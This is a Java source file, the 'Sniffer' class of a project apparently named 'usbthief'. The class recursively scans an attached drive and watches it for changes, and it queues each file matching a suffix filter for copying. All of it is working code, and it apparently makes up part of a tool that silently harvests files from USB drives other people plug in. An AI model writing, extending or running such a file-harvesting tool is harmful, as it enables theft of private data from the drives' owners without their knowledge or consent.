package com.superredrock.usbthief.worker;

import com.superredrock.usbthief.core.Device;
import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.config.ConfigSchema;
import com.superredrock.usbthief.core.QueueManager;
import com.superredrock.usbthief.core.event.EventBus;
import com.superredrock.usbthief.core.event.worker.FileDiscoveredEvent;
import com.superredrock.usbthief.core.filter.BasicFileFilter;
import com.superredrock.usbthief.core.filter.SuffixFilter;

import java.io.Closeable;
import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.Map;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.BiPredicate;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import com.superredrock.usbthief.worker.SnifferLifecycleManager;

public class Sniffer extends Thread implements Closeable {
    protected static final Logger logger = Logger.getLogger(Sniffer.class.getName());

    private final Path root;
    private final WatchService monitor;
    private final Device device;

    private final AtomicInteger changeCount = new AtomicInteger(0);
    private final ConcurrentHashMap<Path, WatchKey> watchKeys = new ConcurrentHashMap<>();
    private volatile boolean running = true;
    
    /**
     * Dedicated ForkJoinPool for parallel file scanning.
     * Allows interrupt via shutdownNow() during initial scan.
     */
    private static final ForkJoinPool scanPool = ForkJoinPool.commonPool();

    public Sniffer(Device device, FileStore rootStore) {
        super(QueueManager.getDiskScanners(), "DiskScanner: " + rootStore.name());
        this.device = device;
        this.root = device.getRootPath();
        WatchService ws;
        try {
            ws = FileSystems.getDefault().newWatchService();
        } catch (IOException e) {
            logger.warning("Failed to create WatchService: " + e.getMessage());
            ws = null;
        }
        this.monitor = ws;
    }

    @Override
    public void run() {
        try {performInitialScan();}
        catch (IOException e) {
            logger.severe("Error while scanning disk: " + e.getMessage());
            SnifferLifecycleManager.getInstance().scheduleRestart(device, SnifferLifecycleManager.RestartReason.ERROR);
            return;
        }

        if (Thread.currentThread().isInterrupted()) {
            SnifferLifecycleManager.getInstance().scheduleRestart(device, SnifferLifecycleManager.RestartReason.NORMAL_COMPLETION);
            return;
        }

        if (!ConfigManager.getInstance().get(ConfigSchema.WATCH_ENABLED)) {
            logger.info("File monitoring disabled, scanner finished");
            SnifferLifecycleManager.getInstance().scheduleRestart(device, SnifferLifecycleManager.RestartReason.NORMAL_COMPLETION);
            return;
        }

        logger.info("Starting file monitoring for " + root);

        if (monitor == null) {
            logger.warning("WatchService not available, skipping file monitoring");
        } else {
            startMonitoring();
        }
    }

    private void performInitialScan() throws IOException {
        logger.info("Scanning Disk " + root);
        BiPredicate<Path, BasicFileAttributes> filter = new BasicFileFilter(ConfigManager.getInstance());
        SuffixFilter suffixFilter = new SuffixFilter(ConfigManager.getInstance());

        ForkJoinTask<?> scan = scanPool.submit(
                () -> {
                    try (Stream<Path> paths = Files.find(root, Integer.MAX_VALUE, filter).parallel()) {
                        paths.filter(suffixFilter.asPredicate())
                                .peek(path -> {
                            long fileSize = 0;
                            try {fileSize = Files.size(path);} catch (IOException _) {}
                            EventBus.getInstance().dispatch(new FileDiscoveredEvent(path, fileSize, device.getSerialNumber()));})
                                .forEach(path -> {
                            if (Thread.currentThread().isInterrupted()) {
                                throw new RuntimeException("Scan interrupted");
                            }
                            submitCopyTask(path);
                        });
                    } catch (IOException e) {
                        logger.log(Level.WARNING,"Fail",e);
                    }
                }
                );
        try {
            scan.get();
        } catch (InterruptedException | ExecutionException e) {
            this.interrupt();
            scan.cancel(true);
        }

        logger.info("Initial scan completed for " + root);
    }


    private void processDirectorySafely(Path dir) {
        try {
            submitCopyTask(dir);
            registerDirectoryWatch(dir);
            logger.fine("Registered directory: " + dir);
        } catch (IOException e) {
            logger.warning("Error processing directory " + dir + ": " + e.getMessage());
        }
    }


    private void submitCopyTask(Path path) {
        CopyTask task = new CopyTask(path, device.getSerialNumber());
        TaskScheduler.getInstance().submit(task);
    }

    private void scanNewDirectory(Path dir) throws IOException {
        registerDirectoryWatch(dir);

        BiPredicate<Path, BasicFileAttributes> filter = new BasicFileFilter(ConfigManager.getInstance());
        SuffixFilter suffixFilter = new SuffixFilter(ConfigManager.getInstance());

        try {
            scanPool.submit(() -> {
                try (Stream<Path> paths = Files.find(dir, Integer.MAX_VALUE, filter).filter(suffixFilter.asPredicate()).parallel()) {
                    Map<Boolean, java.util.List<Path>> partitioned = paths.collect(
                        Collectors.partitioningBy(Files::isDirectory)
                    );

                    partitioned.getOrDefault(true, java.util.List.of())
                        .forEach(this::processDirectorySafely);

                    partitioned.getOrDefault(false, java.util.List.of())
                        .parallelStream()
                        .forEach(path -> {
                            long fileSize = 0;
                            try {
                                fileSize = Files.size(path);
                            } catch (IOException e) {
                                logger.fine("Could not get file size for " + path + ": " + e.getMessage());
                            }
                            EventBus.getInstance().dispatch(new FileDiscoveredEvent(path, fileSize, device.getSerialNumber()));
                            submitCopyTask(path);
                        });
                } catch (IOException e) {
                    logger.log(Level.WARNING,"",e);
                }
            }).get();
        }  catch (ExecutionException | InterruptedException e) {
            logger.log(Level.WARNING,"Unknowable Exception, skip scanning " + dir,e);
        }
    }

    private void startMonitoring() {
        Thread resetThread = getResetThread();
        resetThread.start();

        SnifferLifecycleManager.RestartReason exitReason = SnifferLifecycleManager.RestartReason.NORMAL_COMPLETION;

        try {
            while (running && !Thread.currentThread().isInterrupted()) {
                WatchKey key = monitor.take();
                Path watchPath = (Path) key.watchable();

                key.pollEvents().stream()
                    .peek(event -> {
                        if (event.kind() == StandardWatchEventKinds.OVERFLOW) {
                            logger.warning("WatchEvent overflow detected");
                        }
                    })
                    .filter(event -> event.kind() != StandardWatchEventKinds.OVERFLOW)
                    .forEach(event -> handleWatchEvent(watchPath, event));

                if (!key.reset()) {
                    watchKeys.remove(watchPath);
                    if (watchKeys.isEmpty()) {
                        logger.info("All watch keys cancelled, stopping monitor");
                        break;
                    }
                }
            }
        } catch (ClosedWatchServiceException e) {
            logger.info("WatchService closed");
        } catch (InterruptedException e) {
            logger.info("Monitoring interrupted");
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            logger.severe("Error in monitoring loop: " + e.getMessage());
            exitReason = SnifferLifecycleManager.RestartReason.ERROR;
        } finally {
            running = false;
            closeWatchService();
            SnifferLifecycleManager.getInstance().scheduleRestart(device, exitReason);
        }
    }

    private Thread getResetThread() {
        Thread resetThread = new Thread(() -> {
            while (running) {
                try {
                    TimeUnit.SECONDS.sleep(ConfigManager.getInstance().get(ConfigSchema.WATCH_RESET_INTERVAL_SECONDS));
                    int count = changeCount.getAndSet(0);
                    if (count > 0) {
                        logger.fine("Reset change count: " + count);
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }, "ChangeCounterReset");
        resetThread.setDaemon(true);
        return resetThread;
    }

    @SuppressWarnings("unchecked")
    private void handleWatchEvent(Path watchPath, WatchEvent<?> event) {
        WatchEvent.Kind<?> kind = event.kind();

        Path fullPath = watchPath.resolve(((WatchEvent<Path>) event).context());

        try {
            if (!Files.exists(fullPath) || Files.isHidden(fullPath)) {
                return;
            }
        } catch (IOException e) {
            return;
        }

        int newCount = changeCount.incrementAndGet();
        logger.fine("File event: " + kind + " on " + fullPath + " (count: " + newCount + ")");

        if (newCount >= ConfigManager.getInstance().get(ConfigSchema.WATCH_THRESHOLD)) {
            int threshold = ConfigManager.getInstance().get(ConfigSchema.WATCH_THRESHOLD);
            logger.info("Change threshold reached (" + threshold + "), triggering copy");
            changeCount.set(0);
            handleChangedPath(fullPath, kind);
        }
    }

    private void handleChangedPath(Path path, WatchEvent.Kind<?> kind) {
        try {
            if (Files.isDirectory(path) && kind == StandardWatchEventKinds.ENTRY_CREATE) {
                scanNewDirectory(path);
            } else if (Files.isRegularFile(path)) {
                submitCopyTask(path);
            }
        } catch (IOException e) {
            logger.warning("Error handling changed path: " + e.getMessage());
        }
    }

    private void registerDirectoryWatch(Path dir) throws IOException {
        if (monitor == null || watchKeys.containsKey(dir)) {
            return;
        }
        WatchKey key = dir.register(monitor,
            StandardWatchEventKinds.ENTRY_CREATE,
            StandardWatchEventKinds.ENTRY_MODIFY,
            StandardWatchEventKinds.ENTRY_DELETE);
        watchKeys.put(dir, key);
        logger.fine("Registered watch for directory: " + dir);
    }

    public void stopMonitoring() {
        running = false;
        if (monitor != null) {
            try {
                monitor.close();
            } catch (IOException e) {
                logger.warning("Error closing WatchService: " + e.getMessage());
            }
        }
    }

    private void closeWatchService() {
        watchKeys.values().parallelStream()
            .forEach(WatchKey::cancel);

        watchKeys.clear();

        if (monitor != null) {
            try {
                monitor.close();
            } catch (IOException e) {
                logger.warning("Error closing WatchService: " + e.getMessage());
            }
        }
    }

    @Override
    public void close() throws IOException {
        stopMonitoring();
        this.interrupt();
    }
}
